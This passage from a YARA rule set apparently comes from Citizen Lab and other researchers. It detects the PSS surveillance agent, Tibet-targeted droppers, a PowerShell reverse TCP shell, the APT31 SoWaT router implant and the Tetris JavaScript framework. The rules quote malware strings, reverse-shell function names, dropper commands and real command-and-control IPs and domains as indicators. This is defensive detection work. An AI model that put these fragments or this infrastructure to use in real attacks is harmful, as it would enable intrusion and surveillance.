        $s6 = "(%d) %.64s\\%.64s\\%.64s|%.64s|%.64s|%.64s|%.64s|%.64s|%.64s" wide
        $s7 = "Name: %s Due: %02d/%02d/%04d %02d:%02d:%02d, Length: %d seconds" wide
        $s8 = "Image will be taken on the next Skype call session." wide
        $s9 = "\\\\.\\pipe\\BrowseIPC" wide
        $s10 = "RES_BINARY" wide
        $s11 = "/{433a-bbaf439-12982d4a-9c27}" wide

    condition:
        uint16(0) == 0x5a4d and $cmdproc and 1 of ($u*) and 4 of ($s*)
}

rule PSS_Pipeserver {
    meta:
        description = "PSS Pipeserver versions 4.x and 5.x"
        author = "Geoffrey Alexander <geoff@citizenlab.ca>"
        data = "2017-07-20"

    strings:
        $u1 = "pss-agent" ascii
        $u2 = "PSS_Agent" ascii
        $u3 = "Agent path too long (>= MAX_PATH)" ascii
        $u4 = "Agent is not running, executing it now\\n" ascii
        $u5 = "Failed to create PssClock!" ascii

        $s1 = "LnkProxy" ascii
        $s2 = "CUSTOMER\\Agent" ascii
        $s3 = "BrowseIPC" ascii
        $s4 = "CustomerConfig is not initialized yet" ascii
        $s5 = "RES_BINARY" ascii
        $s6 = "ipc::security_access::" ascii
        $s7 = "util::Resource::" ascii
        $s8 = "util::System::" ascii
        $s9 = "AgentAdminGlobalEventName" wide
        $s10 = "AgentDummyKillGlobalEventName" wide
        $s11 = "AgentGlobalEventName" wide
        $s12 = "AgentKillGlobalEventName" wide
        $s13 = "AgentPipeServerInitGlobalEventName" wide
        $s14 = "AgentUninstallGlobalEventName" wide
        $s15 = "/M:{0FA12518-0120-0910-A43C-0DAA276D2EA4}" wide
        $s16 = "\\\\.\\pipe\\BrowseIPC" wide
        $s17 = "RES_BINARY" wide
        $s18 = "/{433a-bbaf439-12982d4a-9c27}" wide

    condition:
        uint16(0) == 0x5a4d and 1 of ($u*) and 8 of ($s*)
}

rule PSS_lnkproxy {
    meta:
        description = "PSS lnkproxy versions 4.x and 5.x"
        author = "Geoffrey Alexander <geoff@citizenlab.ca>"
        date = "2017-07-20"

    strings:
        $s1 = "COMMAND_LINE_BEGIN:" ascii
        $s2 = ":COMMAND_LINE_END:" ascii
        $s3 = "Could not execute process when no command is specified" ascii
        $s4 = "lnkproxy.db" ascii
        $s5 = "SPAWN_COMMAND_BEGIN:" ascii
        $s6 = ":SPAWN_COMMAND_END" ascii
        $s7 = "util::Deserializer::" ascii
        $s8 = "util::FileDeserializer::" ascii
        $s9 = "util::File::" ascii
        $s10 = "util::Process::" ascii
        $s11 = "util::System::" ascii

    condition:
        uint16(0) == 0x5a4d and 4 of ($s*)
}

rule PSS_Agent_v6 {
    meta:
        description = "PSS Agent version 6.0.0 and 6.1.0"
        author = "Geoffrey Alexander <geoff@citizenlab.ca>"
        date = "2017-07-20"

    strings:
        $cmdproc = "CmdProc_" wide

        $u1 = "C:\\Windows\\temp\\KB2979214.pdb" ascii
        $u2 = { 06 1f 41 49 4d 48 50 4f 31 }

        $s1 = "Did not complete transaction with pipe server" wide
        $s2 = "SkypeControlAPIAttach" wide
        $s3 = "SkypeControlAPIDiscover" wide
        $s4 = "URL###Execute" wide
        $s5 = "Failed to AddClipboardFormatListener, error [" ascii
        $s6 = "transactionrequest.<xmlattr>" wide
        $s7 = "DC615DA9-94B5-4477-9C33-3A393BC9E63F" ascii
        $s8 = "getip.<xmlattr>.agentid" wide
        $s9 = "AVAgentInstallException@agent@@" ascii
        $s10 = "AVAgentCommandsException@agent@@" ascii
        $s11 = "AVAgentCustomerConfigException@agent@@" ascii
        $s12 = "AVTransactionParsingException@communication@@agent" ascii
        $s13 = "AVStorageException@config@agent@@" ascii
        $s14 = "AVDBStorageException@db@agent@@" ascii

        $str_decrypt_loop = { 8b 47 04 8b ce 83 e1 03 c1 e1 03 ba ?? ?? ?? ?? d3 ea 32 54 35 ?? 88 14 06 46 3b f3 }

    condition:
        uint16(0) == 0x5a4d and $cmdproc and $str_decrypt_loop and 1 of ($u*) and 8 of ($s*)
}

rule PSS_lnkproxy_v6 {
    meta:
        description = "PSS lnkproxy version 6.0.0 and 6.1.0"
        author = "Geoffrey Alexander <geoff@citizenlab.ca>"
        date = "2017-07-20"

    strings:
        $s1 = "C:\\Windows\\temp\\KB2971112.pdb"
        $s2 = "AVResourceException@exception@util@@" ascii
        $s3 = "AVLnkControllerException@LnkProxy@@" ascii
        $s4 = "AVLnkPayloadException@@" ascii
        $s5 = "AVShellLinkException@LnkProxy@@" ascii
        $s6 = "AVFileUtilitiesException@LnkProxy@@" ascii
        $s7 = "AVLnkEntryException@LnkProxy@@" ascii
        $s8 = "AVFileRollbackException@LnkProxy@@" ascii

        $str_decrypt_loop = { 8b 47 04 8b ce 83 e1 03 c1 e1 03 ba ?? ?? ?? ?? d3 ea 32 54 35 ?? 88 14 06 46 3b f3 }

    condition:
        uint16(0) == 0x5a4d and 3 of ($s*) and $str_decrypt_loop
}

rule PSS_Pipeserver_v6 {
    meta:
        description = "PSS Pipeserver version 6.0.0 and 6.1.0"
        author = "Geoffrey Alexander <geoff@citizenlab.ca>"
        date = "2017-07-20"

    strings:
        $p1 = "PSS_Agent" ascii
        $p2 = "pss-agent" ascii

        $s1 = "%2s%u.%u.%u.%u\\\\n" wide
        $s2 = "CustomerConfigException@agent" ascii

        $str_decrypt_loop = { 8b 47 04 8b ce 83 e1 03 c1 e1 03 ba ?? ?? ?? ?? d3 ea 32 54 35 ?? 88 14 06 46 3b f3 }

    condition:
        uint16(0) == 0x5a4d and $str_decrypt_loop and 1 of ($p*) and 1 of ($s*)
}
rule powershell_dropper {
    meta:
        author = "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $a = "$decentID = [System.Convert]::FromBase64String($indecentID)"
        $b = "if($tmp[1].CPU -gt 0) {} else {[ReverseTCPShell]::run()}"
        $c = "function Get-RSACode()"
        $d = "-file %temp%\\233.ps1"

    condition:
        1 of them
}

rule dropper_strings {
    meta:
        author = "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $a = "bitsadmin /canceft\\windows\\currebitsadmin /addfibitsadmin /Resumbitsadmin /SetNosoftware"
        $b = "\\microsotifyCmdLine %s rle %s c:\\windowsbitsadmin /creat\\system32\\net.ex"
        $c = "rundll32.exe %s Main"
        $d = "d1fasg34"
        $e = "FindResource %s error"

    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule payload_wab32res_strings {
    meta:
        author = "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $a1 = "%02d%02d%02d%02d%02d%03d"
        $a2 = "459B2-3311-54C3- /Processid:{712"
        $a3 = "CreateProcess %s"
        $a4 = "FakeRun.dll"
        $a5 = "Release\\FakeRun.pdb"

    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule pcnt_cert {
    meta:
        author = "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $a = "MIIDWjCCAkICCQCdeJZhGKJakTANBgkqhkiG9w0BAQUFADBvMQswCQYDVQQGEwJV"
        $b = "UzERMA8GA1UECAwITmVicmFza2ExEDAOBgNVBAcMB0xpbmNvbG4xDTALBgNVBAoM"
        $c = "BFBDTlQxDTALBgNVBAsMBFBDTlQxHTAbBgkqhkiG9w0BCQEWDnBjbnRAZ21haWwu"
        $d = "Y29tMB4XDTE4MDEwNjA2MDMyMloXDTI4MDEwNDA2MDMyMlowbzELMAkGA1UEBhMC"
        $e = "VVMxETAPBgNVBAgMCE5lYnJhc2thMRAwDgYDVQQHDAdMaW5jb2xuMQ0wCwYDVQQK"
        $f = "DARQQ05UMQ0wCwYDVQQLDARQQ05UMR0wGwYJKoZIhvcNAQkBFg5wY250QGdtYWls"
        $g = "LmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK+ihHezE6jjS2Vl"
        $h = "/rIIQsrczmbjU/4KYDiLiCcrxN0tht6GzL281KGoW13IiQvKILANmx02IAy5tzij"
        $i = "0W9ZvFAIRRYVDpoSU+EyXz4LjHgXvw6VeG9v3HV99iSmphkq7mLYee0EPYP6wSdB"

    condition:
        uint16(0) == 0x5A4D and all of them
}

rule custom_decryption {
    meta:
        author = "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $encrypt = { 8b d6 81 e2 07 00 00 80 79 05 4a 83 ca f8 42 8a 04 1e 0f be 0c 95 28 7e 46 00 34 01 0f be c0 0f af c8 80 f1 67 88 0c 1e 46 3b f7 7c d3 }
        $encrypt2 = { 8A 0C 30 8B D0 83 E2 07 80 F1 01 0F BE C9 0F BE 54 95 D0 0F AF D1 80 F2 85 88 14 30 40 }
        $decrypt_file1 = { 0f b6 01 8b d6 83 e2 07 34 01 0f be c0 83 c6 04 0f be }
        $decrypt_file2 = { 0f af d0 0f b6 41 01 34 01 0f be c0 88 11 8d 14 0f 83 e2 07 0f be }
        $decrypt_file3 = { 0f af d0 0f b6 41 02 34 01 0f be c0 88 51 01 8d 14 0b 83 e2 07 0f be }
        $decrypt_file4 = { 0f af d0 0f b6 41 03 34 01 0f be c0 88 51 02 8b 55 fc 03 d1 83 e2 07 0f be }

    condition:
        uint16(0) == 0x5A4D and ($encrypt or $encrypt2 or all of ($decrypt_file*))
}

rule tclient_strings {
    meta:
        author = "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $a = "sdf81msdf7"
        $b = "software\\klive"
        $c = "\\Registry\\User\\%s\\Software\\KLive"
        $d = "%s\\wab32res.dll"
        $e = "[!]NtDeleteValueKey Error:%ul"
        $f = "%sDebugLog.TXT"
        $g = "Server connect to [%s:%d] Sucesse! token = %s"
        $h = "192.168.70.1"
        $i = "Start %d connect %s:%d"

    condition:
        uint16(0) == 0x5A4D and 3 of them
}

rule tclient_string {
    meta:
        author= "Etienne Maynier"
        email = "etienne@citizenlab.ca"

    strings:
        $a = "showgodmoney1gz"
        $b = "MDDEFGEGETGIZ"

    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule dsng_installer_dll_characteristics {
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $s1 = "dsng.dll"
        $s2 = "InstallD" fullword
        $s3 = "InstallZ" fullword

    condition:
        //MZ header
        uint16(0) == 0x5A4D and

        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and

        all of them
}

rule dsng_installer_dll_stringset {
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $s1 = "KCOM Server Security Guard"
        $s2 = "LoadFlgDllFun"
        $s3 = "Installv" fullword
        $s4 = "Dll path %s"
        $s5 = "MainFunVvv"
        $s6 = "http://dsas.asdf.com/"

    condition:
        //MZ header
        uint16(0) == 0x5A4D and
        //PE signature
        uint32(uint32(0x3C)) == 0x00004550 and
        2 of them
}

rule tibetan_indecent_rtf_meta {
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $operator = "{\\operator Windows \\'d3\\'c3\\'bb\\'a7}"

    condition:
        any of them
}

rule tibetan_indecent_ppsx_meta
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $createdby = "<dc:creator>Windows User</dc:creator>"
        $createdate = "<dcterms:created xsi:type=\"dcterms:W3CDTF\">2017-10-23T00:57:05Z</dcterms:created>"

    condition:
        all of them
}

rule tibetan_indecent_powershell
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $decents1 = "$indecentID" ascii wide
        $decents2 = "$decentID" ascii wide
        $decents3 = "powershell" ascii wide nocase

    condition:
        all of them
}

rule tibetan_indecent_pe_loader_pdb
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        //C:\Users\learn\Desktop\免杀\
        $pdb = {43 3a 5c 55 73 65 72 73 5c 6c 65 61 72 6e 5c 44 65 73 6b 74 6f 70 5c e5 85 8d e6 9d 80}

    condition:
        all of them
}

rule tibetan_indecent_powershell_tcpshell_funcs
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $class = "public class ReverseTCPShell" ascii wide nocase
        $func1 = "public static void run" ascii wide nocase
        $func2 = "public static void runth" ascii wide nocase
        $func3 = "public static void start" ascii wide nocase
        $func4 = "public static bool isOnline" ascii wide nocase
        $func5 = "public static void startCmd" ascii wide nocase
        $func6 = "public static void CmdExited" ascii wide nocase
        $func7 = "public static void DataReceived" ascii wide nocase
        $func8 = "public static void FileReceive" ascii wide nocase
        $func9 = "public static void CmdManager" ascii wide nocase
        $func10 = "public static void SortOutputHandler" ascii wide nocase
        $func11 = "public static void SendLoginInfo" ascii wide nocase
        $func12 = "public static void Send" ascii wide nocase
        $func13 = "public static int SendWithSplit" ascii wide nocase

    condition:
        6 of them

}

rule tibetan_indecent_infrastructure_strings
{
    meta:
        author = "Matt Brooks, @cmatthewbrooks"

    strings:
        $cc1 = "103.55.24.196" ascii wide nocase
        $cc2 = "118.99.59.105" ascii wide nocase
        $cc3 = "27.126.186.222" ascii wide nocase
        $cc4 = "45.127.97.222" ascii wide nocase
        $cc5 = "comemail.email" ascii wide nocase
        $cc6 = "commail.co" ascii wide nocase
        $cc7 = "daynew.today" ascii wide nocase
        $cc8 = "daynews.today" ascii wide nocase
        $cc9 = "tibetfrum.info" ascii wide nocase
        $cc10 = "tibethouse.info" ascii wide nocase
        $cc11 = "tibetnews.info" ascii wide nocase
        $cc12 = "tibetnews.today" ascii wide nocase

    condition:
        any of them

}

rule silent_ppk_strings
{
    meta:
        author = "Geoff Alexander <geoff@citizenlab.ca>"

    strings:
        $s1 = "MainCommandJobSub"
        $s2 = "MainFun002"
        $s3 = "mRecvPkgFun"
        $s4 = "while -- ClientConnect"
        $s5 = "svsdll.log"
        $s6 = "ppk.dat"

    condition:
        uint16(0) == 0x5a4d and 4 of ($s*)
}
rule SUSP_JSframework_fingerprint2
{
	meta:
		author      = "@imp0rtp3"
		description = "fingerprint2 JS library signature, can be used for legitimate purposes"
		reference   = "https://imp0rtp3.wordpress.com/2021/08/12/tetris"

	strings:

		$m1 = "valentin.vasilyev"
		$m2 = "Valentin Vasilyev"
		$m3 = "Fingerprintjs2"
		$a1 = "2277735313"
		$a2 = "289559509"
		$a3 = "1291169091"
		$a4 = "658871167"
		$a5 = "excludeIOS11"
		$a6 = "sortPluginsFor"
		$a7 = "Cwm fjordbank glyphs vext quiz, \\ud83d\\ude03"
		$a8 = "varyinTexCoordinate"
		$a9 = "webgl alpha bits:"
		$a10 = "WEBKIT_EXT_texture_filter_anisotropic"
		$a11 = "mmmmmmmmmmlli"
		$a12 = "'new Fingerprint()' is deprecated, see https://github.com/Valve/fingerprintjs2#upgrade-guide-from-182-to-200"
		$b1 = "AcroPDF.PDF"
		$b2 = "Adodb.Stream"
		$b3 = "AgControl.AgControl"
		$b4 = "DevalVRXCtrl.DevalVRXCtrl.1"
		$b5 = "MacromediaFlashPaper.MacromediaFlashPaper"
		$b6 = "Msxml2.DOMDocument"
		$b7 = "Msxml2.XMLHTTP"
		$b8 = "PDF.PdfCtrl"
		$b9 = "QuickTime.QuickTime"
		$b10 = "QuickTimeCheckObject.QuickTimeCheck.1"
		$b11 = "RealPlayer"
		$b12 = "RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)"
		$b13 = "RealVideo.RealVideo(tm) ActiveX Control (32-bit)"
		$b14 = "Scripting.Dictionary"
		$b15 = "SWCtl.SWCtl"
		$b16 = "Shell.UIHelper"
		$b17 = "ShockwaveFlash.ShockwaveFlash"
		$b18 = "Skype.Detection"
		$b19 = "TDCCtl.TDCCtl"
		$b20 = "WMPlayer.OCX"
		$b21 = "rmocx.RealPlayer G2 Control"
		$b22 = "rmocx.RealPlayer G2 Control.1"

	condition:
		filesize < 1000000 and (
			(
				all of ($m*) and 
				2 of ($a*)
			) 
			or 8 of ($a*)
			or (
				5 of ($a*)
				and 13 of ($b*)
			)
		)

}


import "elf"

rule apt_CN_31_sowat_strings
{
	meta:
		author      = "@imp0rtp3"
		description = "Apt31 router implant (SoWaT) strings"
		reference   = "https://imp0rtp3.wordpress.com/2021/11/25/sowat/"
		
	strings:
		$a1 = "exc_cmd time out" fullword
		$a2 = "exc_cmd pipe err" fullword
		$a3 = "./swt  del" fullword
		$a4 = "mv -f %s %s ;chmod 777 %s " fullword
		$a5 = "./%s  port  %d " fullword
		$a6 = "./%s  del  %d " fullword
		
		// Likely deleted in next versions
		$a7 = "Usage : ntpclient destination\n" fullword
		$a8 = "killedd" fullword
		
		// Chacha encryption key
		$a9 = {53 14 3d 23 94 78 a9 68 2f 68 c9 a2 1a 93 3c 5b 39 52 2d 1d e0 63 59 1c 30 44 a2 6a 2a 3f a2 95 }

		$b1 = "nameserver" fullword
		$b2 = "conf" fullword
		$b3 = "swt" fullword
		$b4 = "192.168." fullword
		$b5 = "rm %s " fullword
		$b6 = "ipecho.net" fullword
		$b7 = "Host: ipecho.net\x0d\x0a" 
		$b8 = "send errno: %d\x0a" fullword
		$b9 = "exit 0" fullword
		
		// Likely deleted in next versions
		$b10 = "ctrl-c" fullword
		$b11 = "malloc err" fullword
		
	condition:
		uint32(0) == 0x464c457f and
		filesize < 2MB and
		(
			9 of ($b*) or
			3 of ($a*) or
			( 
				6 of ($b*) and 
				any of ($a*)
			) or (
				3 of ($b*) and 
				2 of ($a*)
			)
		)
}

rule apt_CN_31_sowat_code
{
	meta:
		author      = "@imp0rtp3"
		description = "Apt31 router implant (SoWaT) unique code (relevant only for MIPS)"
		reference   = "https://imp0rtp3.wordpress.com/2021/11/25/sowat/"

	strings:
		$c1 = { 25 38 00 00 [8] 38 00 1? 9A 09 F8 20 03 2? 20 A0 02 10 40 92 8E }
		$c2 = { 06 00 30 12 25 20 00 02 04 00 70 12 00 00 00 00 09 F8 20 03 00 00 00 00 ?? 00 BC 8F 01 00 10 26 }
		$c3 = { 00 01 02 24 25 38 00 00 02 00 06 24 ?? 00 A2 A7 09 F8 20 03 ?? 00 A5 27 }
		$c4 = { 09 F8 20 03 25 20 ?0 02 0B 00 02 24 0? 00 22 12 ?? 00 BC 8F }
		$c5 = { ?5 26 ?? 00 BC 8F ?? ?? 99 8F 09 F8 20 03 10 00 04 24 ?? ?? ?5 26 ?? 00 BC 8F ?? ?? 99 8F 09 F8 20 03 0F 00 04 24 01 00 05 24 ?? 00 BC 8F ?? ?? 99 8F 09 F8 20 03 0D 00 04 24 ?? ?? ?5 26 ?? 00 BC 8F ?? ?? 99 8F 09 F8 20 03 0A 00 04 24 } 
		$c6 = { 08 00 03 3C ?? ?? 99 8F 04 00 05 24 80 00 63 24 25 20 00 0? 09 F8 20 03 25 30 43 00 ?? 00 40 04 ?? 00 BC 8F ?? ?? 99 8F 01 00 05 24 09 F8 20 03 0D 00 04 24 }
	
	condition:
		uint32(0) == 0x464c457f and 
		filesize < 2MB and
		(
			elf.machine == elf.EM_MIPS_RS3_LE or
			elf.machine == elf.EM_MIPS
		) and 4 of ($c*)

}
rule apt_CN_Tetris_JS_simple
{

	meta:
		author      = "@imp0rtp3"
		description = "Jetriz, Swid & Jeniva from Tetris framework signature"
		reference   = "https://imp0rtp3.wordpress.com/2021/08/12/tetris"
		
	strings:
		$a1 = "c2lnbmFs" // 'noRefererJsonp'
		$a2 = "ZW50cmllcw==" // 'BIDUBrowser'
		$a3 = "aGVhcnRCZWF0cw==" // 'Int8Array,Uint8Array,Uint8ClampedArray,Int16Array,Uint16Array,Int32Array,Uint32Array,Float32Array,Float64Array'
		$a4 = "ZmV0Y2g=" // 'return new F('
		$a5 = "c3BsaWNl" // 'Mb2345Browser'
		$a6 = "TWl1aUJyb3dzZXI=" // 'ipec'
		$a7 = "Zm9udA==" // 'heartBeats'
		$a8 = "OS4w" // 'addIEMeta'
		$a9 = "Xi4qS29ucXVlcm9yXC8oW1xkLl0rKS4qJA==" // 'ClientRectList'
		$a10 = "dHJpbVJpZ2h0" // '<script>document.F=Object</script>'
		$a11 = "UHJlc3Rv" // 'baiduboxapp'
		$a12 = "Xi4qUWlob29Ccm93c2VyXC8oW1xkLl0rKS4qJA==" // 'OnlineTimer'
		$a13 = "bWFyaw==" // 'regeneratorRuntime = r'
		$a14 = "cHJvamVjdElk" // 'onrejectionhandled'
		$a15 = "IHJlcXVpcmVkIQ==" // 'finallyLoc'

		$b1 = "var a0_0x"

	condition:
		$b1 at 0 or
		5 of ($a*)

}


rule apt_CN_Tetris_JS_advanced_1
{
	meta:
		author      = "@imp0rtp3"
		description = "Unique code from Jetriz, Swid & Jeniva of the Tetris framework"
		reference   = "https://imp0rtp3.wordpress.com/2021/08/12/tetris"


	strings:
		$a1 = "var a0_0x"
		$b1 = /a0_0x[a-f0-9]{4}\('0x[0-9a-f]{1,3}'\)/
		$c1 = "))),function(){try{var _0x"
		$c2 = "=window)||void 0x0===_0x"
		$c3 = "){}});}();};window['$']&&window['$']()[a0_0x"
		$c4 = "&&!(Number(window['$']()[a0_0x"
		$c5 = "=function(){return!window['$']||!window['$']()[a0_0x" // second
		$c6 = "')]||Number(window['$']()[a0_0x"
		$c7 = "')]>0x3&&void 0x0!==arguments[0x3]?arguments[0x3]:document;"
		$d1 = "){if(opener&&void 0x0!==opener[" //not dep on a0
		$d2 = "&&!/loaded|complete/"
		$d3 = "')]=window['io']["
		$d4 = "==typeof console["
		$d5 = /=setInterval\(this\[[a-fx0-9_]{2,10}\([0-9a-fx']{1,8}\)\]\[[a-fx0-9_]{2,10}\([0-9a-fx']{1,8}\)\]\(this\),(0x1388|5000)\);}/
		$d6 = "['shift']());}};"
		$d7 = "=Function('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');');"
		$d8 = "['atob']=function("
		$d9 = ")['replace'](/=+$/,'');var"
		$d10 = /\+=String\['fromCharCode'\]\(0xff&_?[0-9a-fx_]{1,10}>>\(\-(0x)?2\*/
		$e1 = "')](__p__)"
	condition:
	$a1 at 0 
	or (
		filesize<1000000
		and (
			#b1 > 2000
			or #e1 > 1 
			or 3 of ($c*)
			or 6 of ($d*) 
			or ( 	
				any of ($c*) 
				and 4 of ($d*)
			)
		)
	)
}

rule apt_CN_Tetris_JS_advanced_2
{
	meta:
		author      = "@imp0rtp3"
		description = "Strings used by Jetriz, Swid & Jeniva of the Tetris framework"
		reference   = "https://imp0rtp3.wordpress.com/2021/08/12/tetris"

	strings:
		$a1 = "SFRNTEFsbENvbGxlY3Rpb24=" // '#Socket receive,'
		$a2 = "Y2FuY2VsYWJsZQ==" // '#socket receive,'
		$a3 = "U29nb3U=" // '#task'
		$a4 = "U291cmNlQnVmZmVyTGlzdA==" // '/public/_images/'
		$a5 = "RE9NVG9rZW5MaXN0" // '/public/dependence/jquery/1.12.4/jquery.min.js'
		$a6 = "c2V0U3Ryb25n" // '/public/jquery.min.js?ver='
		$a7 = "ZWxlbQ==" // '/public/socket.io/socket.io.js'
		$a8 = "SW50MzI=" // '/sSocket'
		$a9 = "cmVzdWx0" // '/zSocket'
		$a10 = "dHJpbVJpZ2h0" // '<script>document.F=Object</script>'
		$a11 = "TUFYX1NBRkVfSU5URUdFUg==" // 'AliApp(TB'
		$a12 = "ZW50cmllcw==" // 'BIDUBrowser'
		$a13 = "X19wcm90b19f" // 'Body not allowed for GET or HEAD requests'
		$a14 = "Z2V0T3duUHJvcGVydHlTeW1ib2xz" // 'Chromium'
		$a15 = "Xi4qS29ucXVlcm9yXC8oW1xkLl0rKS4qJA==" // 'ClientRectList'
		$a16 = "emgtbW8=" // 'DOMStringList'
		$a17 = "cG93" // 'DataView'
		$a18 = "RmlsZUxpc3Q=" // 'EPSILON'
		$a19 = "YWNvc2g=" // 'FileReader'
		$a20 = "U3VibWl0" // 'Firebug'
		$a21 = "NS4x" // 'Firefox Focus'
		$a22 = "ZmluZEluZGV4" // 'FreeBSD'
		$a23 = "SW52YWxpZCBEYXRl" // 'FxiOS'
		$a24 = "ZGlzcGxheQ==" // 'HTMLSelectElement'
		$a25 = "YmFzZTY0RW5jb2Rl" // 'HeadlessChrome'
		$a26 = "RmxvYXQzMg==" // 'HuaweiBrowser'
		$a27 = "Y2xvbmU=" // 'Iceweasel'
		$a28 = "aGVhcnRCZWF0cw==" // 'Int8Array,Uint8Array,Uint8ClampedArray,Int16Array,Uint16Array,Int32Array,Uint32Array,Float32Array,Float64Array'
		$a29 = "bGFuZw==" // 'IqiyiApp'
		$a30 = "Z2V0TGFuZw==" // 'LBBROWSER'
		$a31 = "c3BsaWNl" // 'Mb2345Browser'
		$a32 = "YXRhbmg=" // 'NEW GET JOB, [GET] URL='
		$a33 = "b25yZWFkeXN0YXRlY2hhbmdl" // 'NEW LocalStorage JOB, [LocalStorage] URL='
		$a34 = "QmFpZHU=" // 'NEW POST JOB, [POST] URL='
		$a35 = "PG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT0=" // 'Number#toPrecision: incorrect invocation!'
		$a36 = "Xi4qUWlob29Ccm93c2VyXC8oW1xkLl0rKS4qJA==" // 'OnlineTimer'
		$a37 = "dXNlclNvY2tldElk" // 'PaintRequestList'
		$a38 = "UGFk" // 'PluginArray'
		$a39 = "MTEuMA==" // 'Promise-chain cycle'
		$a40 = "YWJvcnQ=" // 'QHBrowser'
		$a41 = "Ni41" // 'QQBrowser'
		$a42 = "Y29tbW9uMjM0NQ==" // 'QihooBrowser'
		$a43 = "TnVtYmVyLnRvRml4ZWQ6IGluY29ycmVjdCBpbnZvY2F0aW9uIQ==" // 'SNEBUY-APP'
		$a44 = "Y29uc3RydWN0b3IsaGFzT3duUHJvcGVydHksaXNQcm90b3R5cGVPZixwcm9wZXJ0eUlzRW51bWVyYWJsZSx0b0xvY2FsZVN0cmluZyx0b1N0cmluZyx2YWx1ZU9m" // 'SourceBufferList'
		$a45 = "aG9yaXpvbnRhbA==" // 'Symbian'
		$a46 = "Z2V0VVRDTWlsbGlzZWNvbmRz" // 'URLSearchParams'
		$a47 = "cmVzcG9uc2VUZXh0" // 'WebKitMutationObserver'
		$a48 = "P3Y9" // 'Wechat'
		$a49 = "Ni4y" // 'Weibo'
		$a50 = "NjA4NzgyMjBjMjVmYmYwMDM1Zjk4NzZj" // 'X-Request-URL'
		$a51 = "aXNDb25jYXRTcHJlYWRhYmxl" // 'XiaoMi'
		$a52 = "dG9JU09TdHJpbmc=" // 'YaBrowser'
		$a53 = "ZGVm" // '[object Int16Array]'
		$a54 = "Y29uY2F0" // '^.*2345Explorer\\/([\\d.]+).*$'
		$a55 = "YnJvd3Nlckxhbmd1YWdl" // '^.*BIDUBrowser[\\s\\/]([\\d.]+).*$'
		$a56 = "ZGVidWc=" // '^.*IqiyiVersion\\/([\\d.]+).*$'
		$a57 = "W29iamVjdCBVaW50OENsYW1wZWRBcnJheV0=" // '^.*SogouMobileBrowser\\/([\\d.]+).*$'
		$a58 = "Z2V0" // '^Mozilla\\/\\d.0 \\(Windows NT ([\\d.]+);.*$'
		$a59 = "c3RvcA==" // '__FILE__'
		$a60 = "TUFYX1ZBTFVF" // '__core-js_shared__'
		$a61 = "Y3Jvc3NPcmlnaW4=" // '__devtools__'
		$a62 = "SWNlYXBl" // '__p__'
		$a63 = "Ym9sZA==" // '__pdr__'
		$a64 = "dHJpbQ==" // '__proto__'
		$a65 = "TnVtYmVyI3RvUHJlY2lzaW9uOiBpbmNvcnJlY3QgaW52b2NhdGlvbiE=" // '_initBody'
		$a66 = "cmVtb3ZlQ2hpbGQ=" // 'addEventListener'
		$a67 = "OS4w" // 'addIEMeta'
		$a68 = "ZGV2dG9vbHNjaGFuZ2U=" // 'addNoRefererMeta'
		$a69 = "bmV4dExvYw==" // 'appendChild'
		$a70 = "OTg2" // 'application/360softmgrplugin'
		$a71 = "aXNHZW5lcmF0b3JGdW5jdGlvbg==" // 'application/hwepass2001.installepass2001'
		$a72 = "ZW4t" // 'application/vnd.chromium.remoting-viewer'
		$a73 = "UHJlc3Rv" // 'baiduboxapp'
		$a74 = "c29tZQ==" // 'browserLanguage'
		$a75 = "Q3JPUw==" // 'callback'
		$a76 = "U05FQlVZLUFQUA==" // 'charCodeAt'
		$a77 = "Vml2bw==" // 'clearImmediate'
		$a78 = "RGlzcGF0Y2g=" // 'codePointAt'
		$a79 = "ZXhwb3J0cw==" // 'copyWithin'
		$a80 = "QlJFQUs=" // 'credentials'
		$a81 = "a2V5cw==" // 'crossOrigin'
		$a82 = "TWVzc2FnZUNoYW5uZWw=" // 'crossOriginJsonp'
		$a83 = "YWRkRXZlbnRMaXN0ZW5lcg==" // 'devtoolschange'
		$a84 = "c2F2ZQ==" // 'executing'
		$a85 = "dG9KU09O" // 'fakeScreen'
		$a86 = "d2ViZHJpdmVy" // 'fastKey'
		$a87 = "IHJlcXVpcmVkIQ==" // 'finallyLoc'
		$a88 = "Xi4qT1MgKFtcZF9dKykgbGlrZS4qJA==" // 'g__Browser'
		$a89 = "c2NyaXB0VmlhV2luZG93" // 'getAllResponseHeaders'
		$a90 = "Q2xpZW50UmVjdExpc3Q=" // 'getHighestZindex'
		$a91 = "dG9QcmltaXRpdmU=" // 'getOwnPropertyDescriptors'
		$a92 = "bGlua3M=" // 'handleLS'
		$a93 = "MTEuMQ==" // 'handleMessage'
		$a94 = "RGF0YVRyYW5zZmVySXRlbUxpc3Q=" // 'hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables'
		$a95 = "Zm9udA==" // 'heartBeats'
		$a96 = "Q1NTU3R5bGVEZWNsYXJhdGlvbg==" // 'heartBeatsForLS'
		$a97 = "ZW5jdHlwZQ==" // 'heartbeat'
		$a98 = "W29iamVjdCBXaW5kb3dd" // 'hiddenIframe'
		$a99 = "c3Vic3Ry" // 'hiddenImg'
		$a100 = "aW5uZXJXaWR0aA==" // 'iQiYi'
